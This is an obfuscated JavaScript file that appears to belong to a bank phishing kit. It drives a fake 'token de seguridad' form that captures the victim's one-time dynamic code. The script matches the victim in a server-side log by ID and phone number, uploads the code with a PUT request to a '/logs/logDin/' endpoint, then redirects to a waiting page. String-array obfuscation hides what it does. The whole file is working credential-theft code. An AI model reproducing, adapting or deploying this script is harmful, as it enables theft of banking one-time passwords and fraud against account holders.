function _0x3a93(_0x5d36ab, _0x4ad125) {
  const _0x1fb6ad = _0x1fb6();
  return (
    (_0x3a93 = function (_0x3a934b, _0x26acef) {
      _0x3a934b = _0x3a934b - 0x195;
      let _0x220e50 = _0x1fb6ad[_0x3a934b];
      return _0x220e50;
    }),
    _0x3a93(_0x5d36ab, _0x4ad125)
  );
}
const _0x407956 = _0x3a93;
(function (_0x43e27e, _0x24310c) {
  const _0x1a0c5d = _0x3a93,
    _0x5339ce = _0x43e27e();
  while (!![]) {
    try {
      const _0x5c5263 =
        (parseInt(_0x1a0c5d(0x19d)) / 0x1) *
          (parseInt(_0x1a0c5d(0x1a1)) / 0x2) +
        (-parseInt(_0x1a0c5d(0x1b8)) / 0x3) *
          (parseInt(_0x1a0c5d(0x1ad)) / 0x4) +
        (parseInt(_0x1a0c5d(0x1b5)) / 0x5) *
          (parseInt(_0x1a0c5d(0x1aa)) / 0x6) +
        -parseInt(_0x1a0c5d(0x1a6)) / 0x7 +
        (parseInt(_0x1a0c5d(0x197)) / 0x8) *
          (parseInt(_0x1a0c5d(0x1b1)) / 0x9) +
        -parseInt(_0x1a0c5d(0x1b2)) / 0xa +
        (-parseInt(_0x1a0c5d(0x1b0)) / 0xb) *
          (-parseInt(_0x1a0c5d(0x1a0)) / 0xc);
      if (_0x5c5263 === _0x24310c) break;
      else _0x5339ce["push"](_0x5339ce["shift"]());
    } catch (_0x2f1e4a) {
      _0x5339ce["push"](_0x5339ce["shift"]());
    }
  }
})(_0x1fb6, 0x721ec);
function _0x1fb6() {
  const _0x1bdb44 = [
    "53383KBqCbM",
    "9dKRmoA",
    "5816440xslAra",
    "GET",
    "wait.html",
    "19990GBoppr",
    "txtOTP",
    "/logs/logDin/",
    "9981BqviKq",
    "focus",
    "getElementById",
    "Usuario\x20actualizado\x20con\x20OTP",
    "3888296hzseud",
    "setItem",
    "error",
    "reg",
    "disabled",
    "Error\x20al\x20actualizar\x20usuario\x20con\x20OTP",
    "1VuHfpA",
    "info",
    "application/json",
    "456ShWxIf",
    "1409104roagym",
    "Por\x20favor\x20ingrese\x20token\x20de\x20seguridad",
    "Error\x20al\x20procesar\x20el\x20OTP:",
    "json",
    "btnOTP",
    "3523814lcsoGl",
    "idreg",
    "preventDefault",
    "metaInfo",
    "1230cCOGBH",
    "click",
    "value",
    "772YUEKam",
    "stringify",
    "Ingresó\x20Dinámica",
  ];
  _0x1fb6 = function () {
    return _0x1bdb44;
  };
  return _0x1fb6();
}
function updateLS() {
  const _0x5dbe43 = _0x3a93;
  LS[_0x5dbe43(0x198)](_0x5dbe43(0x19e), JSON[_0x5dbe43(0x1ae)](info));
}
const otpButton = document[_0x407956(0x195)](_0x407956(0x1a5)),
  numberMovil = document[_0x407956(0x195)](_0x407956(0x1b6));
async function updateOtp() {
  const _0x205f71 = _0x407956;
  try {
    const _0x515f53 = await fetch(url + "/logs/logs", {
      method: _0x205f71(0x1b3),
      headers: { "Content-Type": _0x205f71(0x19f) },
    });
    if (!_0x515f53["ok"])
      throw new Error(
        "Error\x20al\x20obtener\x20los\x20datos\x20del\x20servidor"
      );
    const _0x2a9c19 = await _0x515f53["json"](),
      _0x294d30 = [..._0x2a9c19];
    for (const _0x2e88b8 of _0x294d30) {
      if (
        _0x2e88b8[_0x205f71(0x19a)] == info[_0x205f71(0x1a9)]["cc"] &&
        _0x2e88b8["cl"] == info[_0x205f71(0x1a9)]["telnum"]
      ) {
        console["log"]("Usuario\x20Encontrado");
        const _0x395d2c = await fetch(
          url + _0x205f71(0x1b7) + _0x2e88b8[_0x205f71(0x1a7)],
          {
            method: "PUT",
            headers: { "Content-Type": _0x205f71(0x19f) },
            body: JSON[_0x205f71(0x1ae)]({
              din: info[_0x205f71(0x1a9)]["cdin"],
              status: _0x205f71(0x1af),
            }),
          }
        );
        if (!_0x395d2c["ok"]) throw new Error(_0x205f71(0x19c));
        const _0x220575 = await _0x395d2c[_0x205f71(0x1a4)]();
        console["log"](_0x205f71(0x196));
      }
    }
    window["location"]["href"] = _0x205f71(0x1b4);
  } catch (_0x2c21cd) {
    console[_0x205f71(0x199)](_0x205f71(0x1a3), _0x2c21cd),
      (otpButton["disabled"] = ![]);
  }
}
otpButton["addEventListener"](_0x407956(0x1ab), async function (_0x1ed461) {
  const _0x4fba59 = _0x407956;
  _0x1ed461[_0x4fba59(0x1a8)](), (otpButton["disabled"] = !![]);
  if (numberMovil[_0x4fba59(0x1ac)] == "") {
    alert(_0x4fba59(0x1a2)),
      numberMovil[_0x4fba59(0x1b9)](),
      (otpButton[_0x4fba59(0x19b)] = ![]);
    return;
  } else {
    const _0xd29ae5 = numberMovil["value"];
    (info[_0x4fba59(0x1a9)]["cdin"] = _0xd29ae5), updateLS(), await updateOtp();
  }
});
